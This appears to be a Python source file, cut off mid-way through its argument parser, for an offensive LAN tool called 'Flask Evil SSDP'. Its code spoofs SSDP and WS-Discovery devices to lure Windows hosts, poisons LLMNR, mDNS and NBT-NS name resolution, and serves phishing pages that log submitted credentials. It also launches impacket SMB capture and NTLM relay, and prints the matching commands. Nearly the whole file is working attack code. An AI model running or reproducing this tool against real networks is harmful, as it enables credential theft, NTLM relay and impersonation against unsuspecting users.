#!/usr/bin/env python3

import os
import re
import sys
import socket
import struct
import shutil
import signal
import argparse
import logging
import subprocess
import threading
import netifaces
import random
import time
from datetime import datetime
from ipaddress import ip_address
from multiprocessing import Process
from flask import Flask, render_template_string, request, redirect, abort, send_from_directory
from email.utils import formatdate


# Boot instance id, shared by the WSD AppSequence headers.
INSTANCE_ID = str(int(time.time()))
LOG_FILE = 'logs-essdp.txt'


class Colors:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

    @staticmethod
    def header(text):
        return f"{Colors.CYAN}{Colors.BOLD}[*]{Colors.END} {text}"

    @staticmethod
    def success(text):
        return f"{Colors.GREEN}{Colors.BOLD}[+]{Colors.END} {text}"

    @staticmethod
    def info(text):
        return f"{Colors.BLUE}{Colors.BOLD}[i]{Colors.END} {text}"

    @staticmethod
    def warning(text):
        return f"{Colors.YELLOW}{Colors.BOLD}[!]{Colors.END} {text}"

    @staticmethod
    def error(text):
        return f"{Colors.RED}{Colors.BOLD}[x]{Colors.END} {text}"

    @staticmethod
    def alert(text):
        return f"{Colors.RED}{Colors.BOLD}[*]{Colors.END} {text}"


def log_event(data: str):
    """Append an event to the shared log file and echo it. Used by every listener process."""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{timestamp}:    {data}\n")
    except Exception:
        pass
    print(data)


def gen_uuid() -> str:
    parts = [8, 4, 4, 4, 12]
    return '-'.join(''.join(random.choices('0123456789abcdef', k=n)) for n in parts)


# --------------------------------------------------------------------------- #
#  DNS / NetBIOS wire helpers (shared by the LLMNR / mDNS / NBT-NS poisoners)
# --------------------------------------------------------------------------- #

def dns_qname(data: bytes, offset: int) -> str:
    """Decode a (non-compressed) DNS QNAME for logging."""
    labels = []
    while offset < len(data):
        length = data[offset]
        if length == 0 or (length & 0xC0) == 0xC0:
            break
        labels.append(data[offset + 1:offset + 1 + length].decode('ascii', 'ignore'))
        offset += 1 + length
    return '.'.join(labels)


def dns_qname_end(data: bytes, offset: int) -> int:
    """Return the offset just past the QNAME (i.e. the start of QTYPE)."""
    while offset < len(data):
        length = data[offset]
        if length == 0:
            return offset + 1
        if (length & 0xC0) == 0xC0:
            return offset + 2
        offset += 1 + length
    return offset


def dns_encode_name(name: str) -> bytes:
    out = b''
    for label in name.split('.'):
        if label:
            out += bytes([len(label) & 0x3F]) + label.encode('ascii', 'ignore')
    return out + b'\x00'


def netbios_decode(enc: bytes) -> str:
    """Decode first-level-encoded NetBIOS name (32 bytes -> up to 16 chars)."""
    out = ''
    for i in range(0, len(enc) - 1, 2):
        hi = enc[i] - 0x41
        lo = enc[i + 1] - 0x41
        if hi < 0 or lo < 0 or hi > 15 or lo > 15:
            break
        out += chr((hi << 4) | lo)
    return out.rstrip(' \x00')


# --------------------------------------------------------------------------- #
#  SSDP (UPnP) - reactive M-SEARCH responder + proactive NOTIFY announcer
# --------------------------------------------------------------------------- #

class SSDPListener:
    MCAST_GROUP = '239.255.255.250'
    SSDP_PORT = 1900
    VALID_ST = re.compile(r'^[a-zA-Z0-9.\-_]+:[a-zA-Z0-9.\-_:]+$')

    def __init__(self, local_ip: str, local_port: int, templates_config: list,
                 analyze: bool = False, notify: bool = True, notify_interval: int = 900):
        self.local_ip = local_ip
        self.local_port = local_port
        self.templates_config = templates_config
        self.analyze = analyze
        self.notify = notify and not analyze
        self.notify_interval = notify_interval
        self.known_hosts = []

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('', self.SSDP_PORT))

        mreq = struct.pack('4s4s', socket.inet_aton(self.MCAST_GROUP), socket.inet_aton(local_ip))
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        # Needed so our own NOTIFY multicasts leave on the right interface.
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(local_ip))
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)

    @staticmethod
    def _gen_usn() -> str:
        return 'uuid:' + gen_uuid()

    def _nt_set(self, cfg):
        """The three advertisement targets a real root device announces."""
        return ['upnp:rootdevice', cfg['session_usn'], cfg.get('device_type', 'upnp:rootdevice')]

    def _location(self, idx):
        return f'http://{self.local_ip}:{self.local_port}/ssdp/{idx}/device-desc.xml'

    def send_location(self, address, st, template_idx):
        """Unicast 200 OK answering an M-SEARCH (echoes the requested ST)."""
        date = formatdate(timeval=None, localtime=False, usegmt=True)
        usn = self.templates_config[template_idx]['session_usn']

        response = (
            f'HTTP/1.1 200 OK\r\n'
            f'CACHE-CONTROL: max-age=1800\r\n'
            f'DATE: {date}\r\n'
            f'EXT:\r\n'
            f'LOCATION: {self._location(template_idx)}\r\n'
            f'OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n'
            f'01-NLS: {usn}\r\n'
            f'SERVER: UPnP/1.0\r\n'
            f'ST: {st}\r\n'
            f'USN: {usn}::{st}\r\n'
            f'BOOTID.UPNP.ORG: 0\r\n'
            f'CONFIGID.UPNP.ORG: 1\r\n'
            f'\r\n'
        ).encode('utf-8')

        self.sock.sendto(response, address)

    def _notify(self, nts: str):
        """Multicast a NOTIFY (ssdp:alive / ssdp:byebye) set for every template."""
        for idx, cfg in enumerate(self.templates_config):
            usn = cfg['session_usn']
            for nt in self._nt_set(cfg):
                usn_val = usn if nt == usn else f'{usn}::{nt}'
                if nts == 'ssdp:alive':
                    msg = (
                        f'NOTIFY * HTTP/1.1\r\n'
                        f'HOST: {self.MCAST_GROUP}:{self.SSDP_PORT}\r\n'
                        f'CACHE-CONTROL: max-age=1800\r\n'
                        f'LOCATION: {self._location(idx)}\r\n'
                        f'NT: {nt}\r\n'
                        f'NTS: ssdp:alive\r\n'
                        f'SERVER: UPnP/1.0\r\n'
                        f'USN: {usn_val}\r\n'
                        f'BOOTID.UPNP.ORG: 0\r\n'
                        f'CONFIGID.UPNP.ORG: 1\r\n'
                        f'\r\n'
                    )
                else:  # ssdp:byebye
                    msg = (
                        f'NOTIFY * HTTP/1.1\r\n'
                        f'HOST: {self.MCAST_GROUP}:{self.SSDP_PORT}\r\n'
                        f'NT: {nt}\r\n'
                        f'NTS: ssdp:byebye\r\n'
                        f'USN: {usn_val}\r\n'
                        f'BOOTID.UPNP.ORG: 0\r\n'
                        f'CONFIGID.UPNP.ORG: 1\r\n'
                        f'\r\n'
                    )
                try:
                    self.sock.sendto(msg.encode('utf-8'), (self.MCAST_GROUP, self.SSDP_PORT))
                except Exception as e:
                    print(Colors.error(f"SSDP NOTIFY error: {e}"))
                time.sleep(0.02)

    def announce_forever(self):
        while True:
            self._notify('ssdp:alive')
            time.sleep(self.notify_interval)

    def _on_term(self, *_):
        if self.notify:
            try:
                self._notify('ssdp:byebye')
            except Exception:
                pass
        sys.exit(0)

    def process_packet(self, data: bytes, address):
        remote_ip = address[0]
        match = re.search(br'(?i)\r\nST:(.*?)\r\n', data)
        if b'M-SEARCH' in data and match:
            st = match.group(1).decode('utf-8', errors='ignore').strip()
            if self.VALID_ST.match(st):
                if (remote_ip, st) not in self.known_hosts:
                    print(Colors.info(f"New host detected: {Colors.BOLD}{remote_ip}{Colors.END} (ST: {st})"))
                    self.known_hosts.append((remote_ip, st))
                if not self.analyze:
                    for idx in range(len(self.templates_config)):
                        self.send_location(address, st, idx)
                        time.sleep(0.05)
            else:
                print(Colors.warning(f"Suspicious ST received: {st} from {remote_ip}"))

    def listen_forever(self):
        if self.notify:
            signal.signal(signal.SIGTERM, self._on_term)
            self._notify('ssdp:alive')
            threading.Thread(target=self.announce_forever, daemon=True).start()
            print(Colors.success(f"SSDP NOTIFY ssdp:alive announcing every {self.notify_interval}s"))
        while True:
            try:
                data, addr = self.sock.recvfrom(1024)
                self.process_packet(data, addr)
            except Exception as e:
                print(Colors.error(f"SSDP listener error: {e}"))


# --------------------------------------------------------------------------- #
#  WS-Discovery (WSD) - the SOAP-over-UDP discovery modern Windows actually uses
#  NOTE: modeled on christgau/wsdd; verify Types/metadata against a live
#  Windows 10/11 target, which is the only reliable way to confirm visibility.
# --------------------------------------------------------------------------- #

WSD_SOAP = 'http://www.w3.org/2003/05/soap-envelope'
WSD_WSA = 'http://schemas.xmlsoap.org/ws/2004/08/addressing'
WSD_DISC = 'http://schemas.xmlsoap.org/ws/2005/04/discovery'
WSD_DEVPROF = 'http://schemas.xmlsoap.org/ws/2006/02/devprof'
WSD_PUB = 'http://schemas.microsoft.com/windows/pub/2005/07'
WSD_MEX = 'http://schemas.xmlsoap.org/ws/2004/09/mex'
WSD_TRANSFER = 'http://schemas.xmlsoap.org/ws/2004/09/transfer'
WSD_ANON = 'http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous'


def wsd_epr(cfg) -> str:
    return 'urn:uuid:' + cfg['session_usn'].split('uuid:')[-1]


def wsd_xaddr(cfg, idx) -> str:
    return f"http://{cfg['local_ip']}:{cfg['local_port']}/wsd/{idx}/metadata.xml"


def wsd_comp_name(cfg) -> str:
    name = re.sub(r'[^A-Za-z0-9\-]', '', cfg.get('device_friendly', cfg['name']).replace(' ', '-'))
    return (name or cfg['name'])[:15]


def _wsd_envelope(header: str, body: str) -> bytes:
    return (
        f'<?xml version="1.0" encoding="utf-8"?>'
        f'<soap:Envelope xmlns:soap="{WSD_SOAP}" xmlns:wsa="{WSD_WSA}" '
        f'xmlns:wsd="{WSD_DISC}" xmlns:wsdp="{WSD_DEVPROF}" xmlns:pub="{WSD_PUB}" '
        f'xmlns:wsx="{WSD_MEX}">'
        f'<soap:Header>{header}</soap:Header>'
        f'<soap:Body>{body}</soap:Body>'
        f'</soap:Envelope>'
    ).encode('utf-8')


def wsd_build_hello(cfg, idx, bye=False):
    action = f'{WSD_DISC}/{"Bye" if bye else "Hello"}'
    tag = 'Bye' if bye else 'Hello'
    header = (
        f'<wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To>'
        f'<wsa:Action>{action}</wsa:Action>'
        f'<wsa:MessageID>urn:uuid:{gen_uuid()}</wsa:MessageID>'
        f'<wsd:AppSequence InstanceId="{INSTANCE_ID}" MessageNumber="1"/>'
    )
    xaddrs = '' if bye else f'<wsd:XAddrs>{wsd_xaddr(cfg, idx)}</wsd:XAddrs>'
    mver = '' if bye else '<wsd:MetadataVersion>1</wsd:MetadataVersion>'
    body = (
        f'<wsd:{tag}>'
        f'<wsa:EndpointReference><wsa:Address>{wsd_epr(cfg)}</wsa:Address></wsa:EndpointReference>'
        f'<wsd:Types>wsdp:Device pub:Computer</wsd:Types>'
        f'{xaddrs}{mver}'
        f'</wsd:{tag}>'
    )
    return _wsd_envelope(header, body)


def wsd_build_match(cfg, idx, relates_to, resolve=False):
    kind = 'ResolveMatches' if resolve else 'ProbeMatches'
    one = 'ResolveMatch' if resolve else 'ProbeMatch'
    header = (
        f'<wsa:To>{WSD_ANON}</wsa:To>'
        f'<wsa:Action>{WSD_DISC}/{kind}</wsa:Action>'
        f'<wsa:MessageID>urn:uuid:{gen_uuid()}</wsa:MessageID>'
        f'<wsa:RelatesTo>{relates_to}</wsa:RelatesTo>'
        f'<wsd:AppSequence InstanceId="{INSTANCE_ID}" MessageNumber="1"/>'
    )
    body = (
        f'<wsd:{kind}><wsd:{one}>'
        f'<wsa:EndpointReference><wsa:Address>{wsd_epr(cfg)}</wsa:Address></wsa:EndpointReference>'
        f'<wsd:Types>wsdp:Device pub:Computer</wsd:Types>'
        f'<wsd:XAddrs>{wsd_xaddr(cfg, idx)}</wsd:XAddrs>'
        f'<wsd:MetadataVersion>1</wsd:MetadataVersion>'
        f'</wsd:{one}></wsd:{kind}>'
    )
    return _wsd_envelope(header, body)


def wsd_build_metadata(cfg, relates_to):
    """WS-Transfer GetResponse: ThisModel / ThisDevice / Relationship(host)."""
    epr = wsd_epr(cfg)
    header = (
        f'<wsa:To>{WSD_ANON}</wsa:To>'
        f'<wsa:Action>{WSD_TRANSFER}/GetResponse</wsa:Action>'
        f'<wsa:MessageID>urn:uuid:{gen_uuid()}</wsa:MessageID>'
        f'<wsa:RelatesTo>{relates_to}</wsa:RelatesTo>'
    )
    body = (
        f'<wsx:Metadata>'
        f'<wsx:MetadataSection Dialect="{WSD_DEVPROF}/ThisModel">'
        f'<wsdp:ThisModel>'
        f'<wsdp:Manufacturer>{cfg.get("device_manufacturer", "UPnP")}</wsdp:Manufacturer>'
        f'<wsdp:ModelName>{cfg.get("device_model", cfg["name"])}</wsdp:ModelName>'
        f'</wsdp:ThisModel>'
        f'</wsx:MetadataSection>'
        f'<wsx:MetadataSection Dialect="{WSD_DEVPROF}/ThisDevice">'
        f'<wsdp:ThisDevice>'
        f'<wsdp:FriendlyName>{cfg.get("device_friendly", cfg["name"])}</wsdp:FriendlyName>'
        f'<wsdp:FirmwareVersion>1.0</wsdp:FirmwareVersion>'
        f'<wsdp:SerialNumber>1</wsdp:SerialNumber>'
        f'</wsdp:ThisDevice>'
        f'</wsx:MetadataSection>'
        f'<wsx:MetadataSection Dialect="{WSD_DEVPROF}/Relationship">'
        f'<wsdp:Relationship Type="{WSD_DEVPROF}/host">'
        f'<wsdp:Host>'
        f'<wsa:EndpointReference><wsa:Address>{epr}</wsa:Address></wsa:EndpointReference>'
        f'<wsdp:Types>pub:Computer</wsdp:Types>'
        f'<wsdp:ServiceId>{epr}</wsdp:ServiceId>'
        f'<pub:Computer>{wsd_comp_name(cfg)}/WORKGROUP</pub:Computer>'
        f'</wsdp:Host>'
        f'</wsdp:Relationship>'
        f'</wsx:MetadataSection>'
        f'</wsx:Metadata>'
    )
    return _wsd_envelope(header, body)


def wsd_extract_msgid(data: bytes) -> str:
    m = re.search(rb'MessageID>\s*([^<\s][^<]*?)\s*<', data)
    return m.group(1).decode('utf-8', 'ignore') if m else f'urn:uuid:{gen_uuid()}'


class WSDListener:
    WSD_GROUP = '239.255.255.250'
    WSD_PORT = 3702

    def __init__(self, local_ip, local_port, templates_config, analyze=False):
        self.local_ip = local_ip
        self.local_port = local_port
        self.templates_config = templates_config
        self.analyze = analyze

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('', self.WSD_PORT))
        mreq = struct.pack('4s4s', socket.inet_aton(self.WSD_GROUP), socket.inet_aton(local_ip))
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(local_ip))
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)

    def send_hello(self, bye=False):
        for idx, cfg in enumerate(self.templates_config):
            try:
                self.sock.sendto(wsd_build_hello(cfg, idx, bye=bye), (self.WSD_GROUP, self.WSD_PORT))
            except Exception as e:
                print(Colors.error(f"WSD hello error: {e}"))
            time.sleep(0.05)

    def _on_term(self, *_):
        try:
            self.send_hello(bye=True)
        except Exception:
            pass
        sys.exit(0)

    def process_packet(self, data, address):
        if b'/Probe' in data:
            kind, resolve = 'Probe', False
        elif b'/Resolve' in data:
            kind, resolve = 'Resolve', True
        else:
            return
        relates = wsd_extract_msgid(data)
        print(Colors.header(f"WSD {kind} from {address[0]} -> answering {len(self.templates_config)} device(s)"))
        if self.analyze:
            return
        for idx, cfg in enumerate(self.templates_config):
            try:
                self.sock.sendto(wsd_build_match(cfg, idx, relates, resolve=resolve), address)
            except Exception as e:
                print(Colors.error(f"WSD match error: {e}"))
            time.sleep(0.05)

    def listen_forever(self):
        if not self.analyze:
            signal.signal(signal.SIGTERM, self._on_term)
            self.send_hello()
            print(Colors.success("WSD Hello announced (UDP 3702)"))
        while True:
            try:
                data, addr = self.sock.recvfrom(4096)
                self.process_packet(data, addr)
            except Exception as e:
                print(Colors.error(f"WSD listener error: {e}"))


# --------------------------------------------------------------------------- #
#  Name-resolution poisoners (Responder-class): LLMNR / mDNS / NBT-NS.
#  These only answer "that name is me (local_ip)". Capturing the resulting
#  NetNTLM auth requires an SMB/HTTP auth listener (impacket / Responder) -
#  see --smb-capture / --relay below.
# --------------------------------------------------------------------------- #

class _MulticastPoisoner:
    GROUP = None
    PORT = None
    NAME = 'POISON'

    def __init__(self, local_ip, analyze=False, respond_to=None):
        self.local_ip = local_ip
        self.analyze = analyze
        self.respond_to = {n.lower() for n in respond_to} if respond_to else None

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('', self.PORT))
        if self.GROUP:
            mreq = struct.pack('4s4s', socket.inet_aton(self.GROUP), socket.inet_aton(local_ip))
            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(local_ip))

    def _wants(self, name):
        return self.respond_to is None or name.lower() in self.respond_to

    def process_packet(self, data, address):
        raise NotImplementedError

    def listen_forever(self):
        if not self.analyze:
            print(Colors.success(f"{self.NAME} poisoner active (UDP {self.PORT})"))
        while True:
            try:
                data, addr = self.sock.recvfrom(2048)
                self.process_packet(data, addr)
            except Exception as e:
                print(Colors.error(f"{self.NAME} error: {e}"))


class LLMNRListener(_MulticastPoisoner):
    GROUP = '224.0.0.252'
    PORT = 5355
    NAME = 'LLMNR'

    def process_packet(self, data, address):
        if len(data) < 13:
            return
        name = dns_qname(data, 12)
        end = dns_qname_end(data, 12)
        if end + 4 > len(data) or data[end:end + 2] != b'\x00\x01':  # A records only
            return
        if not self._wants(name):
            return
        log_event(Colors.alert(f"LLMNR poison: told {address[0]} that '{name}' = {self.local_ip}"))
        if self.analyze:
            return
        question = data[12:end + 4]
        resp = data[0:2] + b'\x80\x00' + b'\x00\x01\x00\x01\x00\x00\x00\x00' + question
        resp += b'\xc0\x0c\x00\x01\x00\x01' + struct.pack('>I', 30) + b'\x00\x04' + socket.inet_aton(self.local_ip)
        self.sock.sendto(resp, address)


class MDNSListener(_MulticastPoisoner):
    GROUP = '224.0.0.251'
    PORT = 5353
    NAME = 'mDNS'

    def process_packet(self, data, address):
        if len(data) < 13:
            return
        name = dns_qname(data, 12)
        end = dns_qname_end(data, 12)
        if end + 4 > len(data) or data[end:end + 2] != b'\x00\x01':  # A records only
            return
        if not self._wants(name):
            return
        log_event(Colors.alert(f"mDNS poison: told {address[0]} that '{name}' = {self.local_ip}"))
        if self.analyze:
            return
        answer = dns_encode_name(name) + b'\x00\x01\x80\x01' + struct.pack('>I', 120)
        answer += b'\x00\x04' + socket.inet_aton(self.local_ip)
        resp = b'\x00\x00\x84\x00\x00\x00\x00\x01\x00\x00\x00\x00' + answer
        try:
            self.sock.sendto(resp, (self.GROUP, self.PORT))
        except Exception:
            self.sock.sendto(resp, address)


class NBTNSListener(_MulticastPoisoner):
    GROUP = None  # broadcast, no multicast join
    PORT = 137
    NAME = 'NBT-NS'

    def __init__(self, local_ip, analyze=False, respond_to=None):
        super().__init__(local_ip, analyze, respond_to)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    def process_packet(self, data, address):
        if len(data) < 50 or data[12] != 0x20:
            return
        if data[46:48] != b'\x00\x20':  # NB queries only (skip NBSTAT)
            return
        name = netbios_decode(data[13:45])
        if not self._wants(name):
            return
        log_event(Colors.alert(f"NBT-NS poison: told {address[0]} that '{name}' = {self.local_ip}"))
        if self.analyze:
            return
        name_field = data[12:46]  # 0x20 + 32 encoded bytes + 0x00
        resp = data[0:2] + b'\x85\x00' + b'\x00\x00\x00\x01\x00\x00\x00\x00'
        resp += name_field + b'\x00\x20\x00\x01' + struct.pack('>I', 165)
        resp += b'\x00\x06\x00\x00' + socket.inet_aton(self.local_ip)
        self.sock.sendto(resp, address)


# --------------------------------------------------------------------------- #
#  Flask HTTP server (device descriptions, WSD metadata, phishing + capture)
# --------------------------------------------------------------------------- #

def create_app(config):
    app = Flask(__name__, template_folder=config['templates_dir'][0] if config['templates_dir'] else '')
    app.config['TEMPLATES_AUTO_RELOAD'] = True

    logging.getLogger('werkzeug').setLevel(logging.ERROR)
    app.logger.setLevel(logging.ERROR)

    templates_config = config['templates_config']

    def log(data: str):
        log_event(data)

    device_xmls = {}
    for idx, tpl_config in enumerate(templates_config):
        device_xml_path = os.path.join(tpl_config['template_dir'], 'device.xml')
        device_xmls[idx] = open(device_xml_path).read() if os.path.exists(device_xml_path) else ''

    @app.route('/ssdp/<int:template_idx>/device-desc.xml')
    def device_desc(template_idx):
        if template_idx >= len(templates_config):
            return abort(404)
        tpl_config = templates_config[template_idx]
        tpl_context = tpl_config.copy()
        tpl_context['template_idx'] = template_idx
        xml = render_template_string(device_xmls[template_idx], **tpl_context)
        print(Colors.header(f"XML Request [Template {template_idx}: {tpl_config['name']}] - Host: {request.remote_addr} UA: {request.headers.get('User-Agent', 'Unknown')[:50]}"))
        return xml, 200, {'Content-Type': 'application/xml'}

    @app.route('/ssdp/<int:template_idx>/service-desc.xml')
    def service_desc(template_idx):
        if template_idx >= len(templates_config):
            return abort(404)
        return '.', 200, {'Content-Type': 'application/xml'}

    @app.route('/wsd/<int:template_idx>/metadata.xml', methods=['GET', 'POST'])
    def wsd_metadata(template_idx):
        if template_idx >= len(templates_config):
            return abort(404)
        tpl_config = templates_config[template_idx]
        relates = wsd_extract_msgid(request.get_data() or b'')
        xml = wsd_build_metadata(tpl_config, relates)
        print(Colors.header(f"WSD metadata request [Template {template_idx}: {tpl_config['name']}] - Host: {request.remote_addr} UA: {request.headers.get('User-Agent', 'Unknown')[:50]}"))
        return xml, 200, {'Content-Type': 'application/soap+xml'}

    @app.route('/ssdp/<int:template_idx>/hook.html', methods=['POST'])
    def hook(template_idx):
        if template_idx >= len(templates_config):
            return abort(404)
        tpl_config = templates_config[template_idx]
        creds = request.form.to_dict()
        msg = Colors.alert(f"Credentials captured [Template {template_idx}: {tpl_config['name']}] - Host: {request.remote_addr}")
        log(msg)
        for key, value in creds.items():
            log(f"  {key}: {value}")
        redirect_url = tpl_config.get('redirect_url') or f"http://{tpl_config['local_ip']}:{tpl_config['local_port']}/ssdp/{template_idx}/present.html"
        return redirect(redirect_url)

    @app.route('/favicon.ico')
    def favicon():
        return '', 404

    @app.route('/present.html')
    def present_html_generic():
        return redirect('/ssdp/0/present.html')

    @app.route('/ssdp/<int:template_idx>/<path:filename>')
    def serve_template_file(template_idx, filename):
        if template_idx >= len(templates_config):
            print(Colors.warning(f"Template index {template_idx} out of range"))
            return abort(404)
        tpl_config = templates_config[template_idx]
        file_path = os.path.join(tpl_config['template_dir'], filename)

        if not os.path.abspath(file_path).startswith(os.path.abspath(tpl_config['template_dir'])):
            return abort(403)

        if filename == 'present.html':
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    html = f.read()
                tpl_context = tpl_config.copy()
                tpl_context['template_idx'] = template_idx
                html_rendered = render_template_string(html, **tpl_context)
                ua = request.headers.get('User-Agent', 'Unknown')
                print(Colors.success(f"Phishing page served [Template {template_idx}: {tpl_config['name']}] - Host: {request.remote_addr} UA: {ua[:50]}"))
                return html_rendered, 200, {'Content-Type': 'text/html'}
            else:
                print(Colors.warning(f"File not found: {file_path}"))
                return abort(404)
        else:
            try:
                return send_from_directory(tpl_config['template_dir'], filename)
            except FileNotFoundError:
                print(Colors.warning(f"Static file not found: {file_path}"))
                return abort(404)

    return app


# --------------------------------------------------------------------------- #
#  Setup helpers
# --------------------------------------------------------------------------- #

def get_interface_ip(interface: str) -> str:
    try:
        addrs = netifaces.ifaddresses(interface)
        return addrs[netifaces.AF_INET][0]['addr']
    except Exception as e:
        print(Colors.error(f"Could not get IP for interface {interface}: {e}"))
        sys.exit(1)


def validate_smb_ip(smb_ip: str, local_ip: str) -> str:
    try:
        ip_address(smb_ip)
        return smb_ip
    except ValueError:
        print(Colors.warning("Invalid SMB IP. Using local IP."))
        return local_ip


def parse_device_meta(device_xml_path: str) -> dict:
    """Pull deviceType / friendlyName / manufacturer / modelName out of device.xml."""
    meta = {
        'device_type': 'upnp:rootdevice',
        'device_friendly': '',
        'device_manufacturer': 'UPnP',
        'device_model': '',
    }
    try:
        with open(device_xml_path) as f:
            xml = f.read()
        for key, tag in (('device_type', 'deviceType'), ('device_friendly', 'friendlyName'),
                         ('device_manufacturer', 'manufacturer'), ('device_model', 'modelName')):
            m = re.search(rf'<{tag}>(.*?)</{tag}>', xml, re.S)
            if m:
                meta[key] = m.group(1).strip()
    except Exception:
        pass
    return meta


def launch_impacket_capture(local_ip, loot_dir):
    exe = shutil.which('impacket-smbserver') or shutil.which('smbserver.py')
    if not exe:
        print(Colors.warning("impacket not found. Install it: pip install impacket  (then rerun with --smb-capture)"))
        print(Colors.info("Manual capture:  sudo impacket-smbserver -smb2support share " + loot_dir))
        return None
    os.makedirs(loot_dir, exist_ok=True)
    cmd = [exe, '-smb2support', '-ip', local_ip, 'share', loot_dir]
    print(Colors.success(f"Launching impacket SMB capture: {' '.join(cmd)}"))
    try:
        return subprocess.Popen(cmd)
    except Exception as e:
        print(Colors.error(f"Could not launch impacket-smbserver: {e}"))
        return None


def launch_relay(target):
    exe = shutil.which('impacket-ntlmrelayx') or shutil.which('ntlmrelayx.py')
    if not exe:
        print(Colors.warning("impacket not found. Install it: pip install impacket  (then rerun with --relay)"))
        print(Colors.info(f"Manual relay:  sudo impacket-ntlmrelayx -t {target} -smb2support"))
        return None
    cmd = [exe, '-t', target, '-smb2support']
    print(Colors.success(f"Launching NTLM relay: {' '.join(cmd)}"))
    try:
        return subprocess.Popen(cmd)
    except Exception as e:
        print(Colors.error(f"Could not launch ntlmrelayx: {e}"))
        return None


def list_templates(script_dir: str):
    templates_dir = os.path.join(script_dir, 'templates')

    if not os.path.isdir(templates_dir):
        print(Colors.error(f"Templates directory not found: {templates_dir}"))
        sys.exit(1)

    try:
        templates = [d for d in os.listdir(templates_dir) if os.path.isdir(os.path.join(templates_dir, d))]

        if not templates:
            print(Colors.warning("No templates found"))
            sys.exit(0)

        print(f"\n{Colors.success('Available templates:')}\n")
        for template in sorted(templates):
            print(f"  • {template}")
        print()
        sys.exit(0)
    except Exception as e:
        print(Colors.error(f"Error listing templates: {e}"))
        sys.exit(1)


def print_banner(args, local_ip, templates_config, extras):
    print("\n" + "─" * 70)
    print(Colors.BOLD + Colors.CYAN + "  FLASK EVIL SSDP - MULTI-TEMPLATE SERVER" + Colors.END)
    print("─" * 70)
    print(f"  {Colors.BOLD}Interface:{Colors.END}           {args.interface} ({local_ip})")
    print(f"  {Colors.BOLD}HTTP Server:{Colors.END}         http://{local_ip}:{args.port}")
    print(f"  {Colors.BOLD}Active Templates:{Colors.END}    {len(templates_config)}")
    print(f"  {Colors.BOLD}Discovery:{Colors.END}           {', '.join(extras) if extras else 'SSDP (M-SEARCH only)'}")
    if args.analyze:
        print(f"  {Colors.BOLD}Mode:{Colors.END}               {Colors.YELLOW}ANALYZE (no responses){Colors.END}")
    print("─" * 70)

    for idx, tpl_cfg in enumerate(templates_config):
        print(f"\n  {Colors.BOLD}Template {idx}: {tpl_cfg['name']}{Colors.END}")
        print(f"    • Device XML:     /ssdp/{idx}/device-desc.xml")
        print(f"    • Hook Endpoint:  /ssdp/{idx}/hook.html")
        print(f"    • Redirect URL:   {tpl_cfg.get('redirect_url', '(default)')}")
        print(f"    • SMB Server:     {tpl_cfg['smb_server']}")

    if args.llmnr or args.nbtns or args.mdns or args.poison:
        print("\n" + "─" * 70)
        print(Colors.info("Name poisoning only redirects victims to you. Capture the NetNTLM with:"))
        print(f"    sudo impacket-smbserver -smb2support -ip {local_ip} share ./loot   # or --smb-capture")
        print(f"    sudo impacket-ntlmrelayx -t <target> -smb2support                  # or --relay <target>")
        print(Colors.warning("SMB-relay fails against SMB-signing hosts (default on Win11 24H2 / Server 2025 / DCs)."))

    print("\n" + "─" * 70 + "\n")


def main():
    parser = argparse.ArgumentParser(description="Flask Evil SSDP - Multi-Template UPnP/WSD Spoofing & LLMNR/NBT-NS/mDNS Poisoning Server")
    parser.add_argument('interface', nargs='?', help='Network interface to bind to')
    parser.add_argument('-p', '--port', type=int, default=8888, metavar='PORT', help='HTTP port (default: 8888)')
    parser.add_argument('-t', '--templates', nargs='+', metavar='TEMPLATE', help='Template names (space-separated)')
    parser.add_argument('-s', '--smb', metavar='SMB', help='SMB server IP for embedded resources / capture target (default: local IP)')
    parser.add_argument('-u', '--urls', nargs='+', metavar='URL', default=[], help='Redirect URLs for each template')
    parser.add_argument('-a', '--analyze', action='store_true', help='Analyze mode (listen/log only, no responses)')
    parser.add_argument('-L', '--list', action='store_true', help='List available templates')
    # --- reach ---
    parser.add_argument('--no-notify', action='store_true', help='Disable proactive SSDP NOTIFY ssdp:alive announcements')
    parser.add_argument('--notify-interval', type=int, default=900, metavar='SEC', help='SSDP NOTIFY re-announce interval (default: 900)')
    parser.add_argument('--wsd', action='store_true', help='Also run a WS-Discovery responder (modern Windows device discovery, UDP 3702)')
    # --- access (name poisoning) ---
    parser.add_argument('--llmnr', action='store_true', help='Enable LLMNR poisoning (UDP 5355)')
    parser.add_argument('--nbtns', action='store_true', help='Enable NBT-NS poisoning (UDP 137)')
    parser.add_argument('--mdns', action='store_true', help='Enable mDNS poisoning (UDP 5353)')
